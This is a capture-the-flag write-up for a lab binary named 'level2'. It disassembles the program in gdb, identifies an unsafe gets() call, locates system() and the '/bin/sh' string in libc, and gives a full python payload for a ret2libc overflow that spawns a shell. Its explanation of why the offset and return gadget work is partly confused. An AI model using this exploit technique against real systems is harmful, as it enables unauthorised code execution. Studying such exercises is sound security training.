```
(gdb) disas main

Dump of assembler code for function main:
   0x0804853f <+0>:     push   %ebp
   0x08048540 <+1>:     mov    %esp,%ebp
   0x08048542 <+3>:     and    $0xfffffff0,%esp
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave
   0x0804854b <+12>:    ret
End of assembler dump.
```

```
(gdb) disas p

Dump of assembler code for function p:
   0x080484d4 <+0>:     push   %ebp
   0x080484d5 <+1>:     mov    %esp,%ebp
   0x080484d7 <+3>:     sub    $0x68,%esp
   0x080484da <+6>:     mov    0x8049860,%eax
   0x080484df <+11>:    mov    %eax,(%esp)
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:    mov    %eax,(%esp)
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
   0x080484fb <+39>:    and    $0xb0000000,%eax
   0x08048500 <+44>:    cmp    $0xb0000000,%eax
   0x08048505 <+49>:    jne    0x8048527 <p+83>
   0x08048507 <+51>:    mov    $0x8048620,%eax
   0x0804850c <+56>:    mov    -0xc(%ebp),%edx
   0x0804850f <+59>:    mov    %edx,0x4(%esp)
   0x08048513 <+63>:    mov    %eax,(%esp)
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
   0x0804851b <+71>:    movl   $0x1,(%esp)
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:    mov    %eax,(%esp)
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
```

When we analyze the P function, it creates a stack (104 bytes). Then it clears stdout with fflush. Then it creates another 76 bytes of space.
When we analyze the code with ghidra or other disassemble programs;

```
	unsigned int check;
	char buf[76];
```

Even if we define an unsigned int as a priority, the system first creates our 76 byte buffer address due to compiler optimisation.
The P function calls the **gets** function (which is an unsafe function and can cause bufferoverflow).
After the **gets** function, we see that it creates the **unsigned int** variable. This was the important part for us.
Because when we analyze it afterwards;

```
   0x080484fb <+39>:    and    $0xb0000000,%eax
   0x08048500 <+44>:    cmp    $0xb0000000,%eax
   0x08048505 <+49>:    jne    0x8048527 <p+83>
```

When we analyze the code written here

```
	if ((check & 0xb0000000) == 0xb0000000) {
		printf("(%p)\n", check);
		exit(1);
	}
```

It compares the unsigned int value 0xb0000000 bits here, if it returns 0xb0000000 result, it prints that address.

So even if we do 76 byte bufferoverflow, we saw from the codes that it creates a 4 byte unsigned int afterwards. Likewise, when we make a bufferoverflow attack according to 76 bytes, it returns the memory address. For this reason, we need to skip this if condition, which means that we will add another 4 byte value as anyone can imagine. So we will make our attack vector according to 80 bytes, not 76 bytes.

Then let's move on to the attack;

```
(gdb) b main

Breakpoint 1 at 0x8048542
(gdb) run

Starting program: /home/user/level2/level2

Breakpoint 1, 0x08048542 in main ()
(gdb) print system

$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

```
system = 0xb7e6b060
little endian = "\x60\xb0\xe6\xb7" 
```


```
(gdb) info proc map

process 3076
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
         0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
        0xb7e2b000 0xb7e2c000     0x1000        0x0
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd2000 0xb7fd5000     0x3000        0x0
        0xb7fdb000 0xb7fdd000     0x2000        0x0
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]

(gdb) find 0xb7e2c000, 0xb7fd2000, "/bin/sh"

0xb7f8cc58
1 pattern found.
```

```
"/bin/sh" = 0xb7f8cc58
little endian = "\x58\xcc\xf8\xb7"
```


```
(python -c 'print("a"*80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" +"aaaa" + "\x58\xcc\xf8\xb7")'; cat) | ./level2
```

> [!TIP]
> "\x3e\x85\x04\x08" It does not have to be a memory address. We only needed a return address, here the address of the p function, but you can also write the return address of main.